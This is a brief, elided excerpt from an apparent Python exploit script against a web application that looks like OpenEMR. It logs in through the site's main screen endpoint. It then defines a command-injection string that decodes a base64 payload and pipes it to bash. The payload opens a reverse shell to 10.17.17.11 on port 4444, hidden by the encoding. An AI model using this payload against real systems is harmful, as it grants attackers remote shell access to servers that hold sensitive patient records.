...
with requests.session() as s:
    ...
    r = s.post(args.host + "/interface/main/main_screen.php?auth=login&site=4", data=login)
    ...
    _cmd = "||echo YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjE3LjE3LjExLzQ0NDQgMD4mMQo= |base64 -d|bash"
